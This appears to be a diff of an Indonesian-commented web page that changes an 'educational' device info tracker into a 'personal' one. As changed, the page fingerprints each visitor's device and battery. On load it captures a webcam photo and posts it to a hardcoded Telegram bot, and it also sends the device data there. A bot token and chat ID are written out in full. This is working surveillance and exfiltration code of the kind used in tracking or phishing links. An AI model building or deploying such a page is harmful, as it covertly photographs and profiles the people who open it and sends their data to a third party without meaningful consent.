@@ -3,19 +3,25 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Device Info Tracker Edukasi</title>
+<title>Device Tracker Personal</title>
 <style>
   body { background: #0d1117; color: #c9d1d9; font-family: Arial, sans-serif; padding: 20px; }
-  pre { background: #161b22; padding: 15px; border-radius: 8px; white-space: pre-wrap; }
+  pre { background: #161b22; padding: 15px; border-radius: 8px; white-space: pre-wrap; max-width: 100%; overflow-x: auto; }
   button { background: #238636; color: white; border: none; padding: 10px 20px; margin-top: 15px; cursor: pointer; border-radius: 5px; font-size: 16px; }
+  video { margin-top: 15px; border-radius: 8px; max-width: 300px; }
 </style>
 </head>
 <body>
-<h1>Device Info Tracker (Edukasi)</h1>
+<h1>Device Tracker (Personal)</h1>
 <pre id="info">Mengambil data...</pre>
 <button id="send">Kirim ke Bot Telegram</button>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
 <script>
+const token = '7435851375:AAH7RpYei5mXA0YU0MogtjZ9FQZgA4ZzoX8'; // ganti dengan token bot Telegrammu
+const chatId = '-1003094524054';   // ganti dengan chat IDmu
+
 function parseOS(ua) {
   if (/Windows/.test(ua)) return "Windows";
   if (/Macintosh/.test(ua)) return "MacOS";
@@ -33,43 +39,55 @@ function parseBrowser(ua) {
   return "Unknown";
 }
 
+async function getBattery() {
+  if (navigator.getBattery) {
+    const battery = await navigator.getBattery();
+    return { level: battery.level * 100 + '%', charging: battery.charging ? 'Ya' : 'Tidak' };
+  }
+  return { level: 'N/A', charging: 'N/A' };
+}
+
 async function getDeviceInfo() {
-  const v = {};
-  const now = new Date();
-  v.ip = "127.0.0.1"; // Hanya placeholder, untuk IP asli perlu izin server
-  v.access_time = now.toISOString();
-  v.local_time = now.toLocaleString();
+  const ua = navigator.userAgent;
+  const battery = await getBattery();
+  const v = {
+    user_agent: ua,
+    os: parseOS(ua),
+    browser: parseBrowser(ua),
+    platform: navigator.platform || 'N/A',
+    screen: `${screen.width}x${screen.height}`,
+    window: `${window.innerWidth}x${window.innerHeight}`,
+    dpr: window.devicePixelRatio || 1,
+    cpu: navigator.hardwareConcurrency || 'N/A',
+    ram: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'N/A',
+    language: navigator.language,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    touch: 'ontouchstart' in window,
+    maxTouchPoints: navigator.maxTouchPoints || 0,
+    cookies: navigator.cookieEnabled,
+    online: navigator.onLine,
+    doNotTrack: navigator.doNotTrack,
+    webdriver: navigator.webdriver || false,
+    pdfViewerEnabled: !!navigator.pdfViewerEnabled,
+    batteryLevel: battery.level,
+    charging: battery.charging,
+    ip: '127.0.0.1', // placeholder, bisa pakai API eksternal jika mau
+    access_time: new Date().toISOString(),
+    local_time: new Date().toLocaleString()
+  };
+  return v;
+}
 
-  v.user_agent = navigator.userAgent;
-  v.platform = navigator.platform;
-  v.screen = `${screen.width}x${screen.height}`;
-  v.window = `${window.innerWidth}x${window.innerHeight}`;
-  v.orientation = screen.orientation ? screen.orientation.type : 'unknown';
-  v.dpr = window.devicePixelRatio || 1;
-
-  v.cpu = navigator.hardwareConcurrency || 'N/A';
-  v.ram = navigator.deviceMemory ? navigator.deviceMemory + "GB" : 'N/A';
-  v.language = navigator.language;
-  v.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-  v.touch = 'ontouchstart' in window;
-  v.maxTouchPoints = navigator.maxTouchPoints || 0;
-  v.cookies = navigator.cookieEnabled;
-  v.online = navigator.onLine;
-
-  v.doNotTrack = navigator.doNotTrack;
-  v.webdriver = navigator.webdriver || false;
-  v.pdfViewerEnabled = !!navigator.pdfViewerEnabled;
-
-  const template = `
+function formatTemplate(v) {
+  return `
 IP: ${v.ip} | Time: ${v.access_time}
-⏳ Date In Device: ${v.local_time}
+⏳ Date In Device : ${v.local_time}
 
 📱 DEVICE OVERVIEW
 📲 Device Name: ${v.user_agent}
-💻 Operating System: ${parseOS(v.user_agent)}
-🌐 Browser: ${parseBrowser(v.user_agent)}
-🔧 Platform: ${v.platform || 'N/A'}
+💻 Operating System: ${v.os}
+🌐 Browser: ${v.browser}
+🔧 Platform: ${v.platform}
 
 🖥️ DISPLAY DETAILS
 📐 Screen Size: ${v.screen}
@@ -94,24 +112,52 @@ IP: ${v.ip} | Time: ${v.access_time}
 🚫 Do Not Track: ${v.doNotTrack === '1' ? '✅ Enabled' : '❌ Disabled'}
 🤖 Webdriver: ${v.webdriver ? '❌ Detected' : '✅ Not Detected'}
 📄 PDF Viewer: ${v.pdfViewerEnabled ? '✅ Available' : '❌ Not Available'}
+
+⚡ BATTERY
+🔋 Level: ${v.batteryLevel}
+⚡ Charging: ${v.charging}
 `;
-  document.getElementById("info").innerText = template;
-  return v;
 }
 
-async function sendToTelegram(v) {
-  const botToken = "7435851375:AAH7RpYei5mXA0YU0MogtjZ9FQZgA4ZzoX8"; // ganti token bot Telegram
-  const chatId = "-1003094524054";     // ganti chat ID
-  const message = encodeURIComponent("Device Info Edukasi:\n" + JSON.stringify(v, null, 2));
-  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`);
+async function sendToTelegram(message) {
+  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: chatId, text: message })
+  });
 }
 
-document.getElementById("send").addEventListener("click", async () => {
+async function start() {
   const v = await getDeviceInfo();
-  await sendToTelegram(v);
+  document.getElementById('info').innerText = formatTemplate(v);
+
+  // Webcam (opsional)
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+    const video = document.getElementById('video');
+    video.srcObject = stream;
+
+    // Ambil foto sekali
+    const canvas = document.getElementById('canvas');
+    await new Promise(res => setTimeout(res, 1000));
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+    canvas.toBlob(blob => {
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', blob);
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
+    }, 'image/jpeg');
+  } catch (e) {
+    console.log('Webcam tidak diizinkan atau tidak tersedia.');
+  }
+}
+
+document.getElementById('send').addEventListener('click', async () => {
+  const v = await getDeviceInfo();
+  await sendToTelegram(formatTemplate(v));
 });
 
-getDeviceInfo();
+start();
 </script>
 </body>
 </html>
